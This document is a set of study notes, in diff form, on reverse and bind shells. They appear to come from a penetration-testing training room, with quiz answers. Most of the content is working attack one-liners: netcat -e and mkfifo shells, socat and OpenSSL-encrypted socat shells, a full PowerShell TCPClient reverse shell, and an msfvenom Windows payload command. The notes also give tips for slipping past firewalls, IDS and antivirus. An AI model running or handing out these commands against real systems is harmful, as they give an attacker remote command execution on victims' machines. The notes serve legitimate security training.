@@ -1,0 +1,434 @@
+In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).
+
+Tools
+
+Netcat
+It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques.
+
+Socat:
+Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:
+The syntax is more difficult
+Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
+
+Metasploit -- multi/handler:
+The exploit/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads.
+
+
+
+
+IMP cheat sheets
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells.
+
+The SecLists repo (https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Types of Shell
+
+Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.
+
+Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way.
+
+
+Reverse Shell example:
+
+On the attacking machine:
+sudo nc -lvnp 443
+
+On the target:
+nc <LOCAL-IP> <PORT> -e /bin/bash
+
+
+Bind Shell example:
+
+On the target:
+nc -lvnp <port> -e "cmd.exe"
+
+
+Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
+interactive shells.
+
+Non-Interactive shells don't give you that luxury. Notice that the whoami command (which is non-interactive) executes perfectly, but the ssh command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere.
+
+
+
+ChatGPT
+Want to turn a non-interactive shell into an interactive one?
+
+Try this after you get a shell:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Then:
+
+Ctrl + Z         # Background the shell
+stty raw -echo   # In your local terminal
+fg               # Resume the shell
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Netcat
+
+Reverse Shells
+
+nc -lvnp <port-number>
+
+-l is used to tell netcat that this will be a listener
+-v is used to request a verbose output
+-n tells netcat not to resolve host names or use DNS.
+-p indicates that the port specification will follow.
+
+it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.
+
+
+Bind Shells
+
+nc <target-ip> <chosen-port>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Netcat Shell Stabilisation
+
+These shells are very unstable by default. Pressing Ctrl + C kills the whole thing.
+
+Technique 1: Python
+
+The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:
+
+1. The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
+
+2. Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
+
+3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+
+Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
+
+
+
+
+Technique 2: rlwrap
+
+rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.
+
+To use rlwrap, we invoke a slightly different listener:
+
+rlwrap nc -lvnp <port>
+
+This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.
+
+
+
+Technique 3: Socat
+Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)(a version of the program compiled to have no dependencies) up to the target machine.
+
+A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).
+
+For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe).
+
+
+
+With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
+
+First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:
+
+Next, in your reverse/bind shell, type in:
+
+stty rows <number>
+
+and
+
+stty cols <number>
+
+Filling in the numbers you got from running the command in your own terminal.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Socat
+
+All socat does is provide a link between two points.
+
+Reverse Shells
+
+socat TCP-L:<port> -
+
+On Windows we would use this command to connect back:
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
+
+This is the equivalent command for a Linux Target:
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+
+Bind Shells
+
+On a Linux target we would use the following command:
+socat TCP-L:<PORT> EXEC:"bash -li"
+
+On a Windows target we would use this command for our listener:
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+
+Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+
+
+Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. 
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
+
+Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary(https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
+
+
+
+
+The special command is as follows:(syntax to connect back to this listener)
+
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
+
+pty, allocates a pseudoterminal on the target -- part of the stabilisation process
+stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
+sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+setsid, creates the process in a new session
+sane, stabilises the terminal, attempting to "normalise" it.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Socat Encrypted Shells
+
+Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.
+
+Suffice to say that any time TCP was used as part of a command, this should be replaced with OPENSSL when working with encrypted shells.
+
+We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
+We then need to merge the two created files into a single .pem file:
+
+cat shell.key shell.crt > shell.pem
+
+Now, when we set up our reverse shell listener, we use:
+
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.
+
+To connect back, we would use:
+
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+The same technique would apply for a bind shell:
+
+Target:
+
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+Attacker:
+
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+
+Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
+
+
+
+
+
+
+
+
+without encryption -  socat TCP-L:53 FILE:tty,raw,echo=0
+
+What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
+
+socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Common Shell Payloads
+
+There is a -e option which allows you to execute a process on connection. For example, as a listener:
+
+nc -lvnp <PORT> -e /bin/bash
+
+Connecting to the above listener with netcat would result in a bind shell on the target.
+
+Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.
+
+On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
+
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+A very similar command can be used to send a netcat reverse shell:
+
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+
+
+
+
+When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.
+
+This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+msfvenom
+
+It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).
+
+msfvenom -p <PAYLOAD> <OPTIONS>
+
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+
+Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
+
+Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+
+Stageless payloads are denoted with underscores (_). The staged equivalent to shell_reverse_tcp payload would be:
+shell/reverse_tcp
+
+msfvenom --list payloads
+
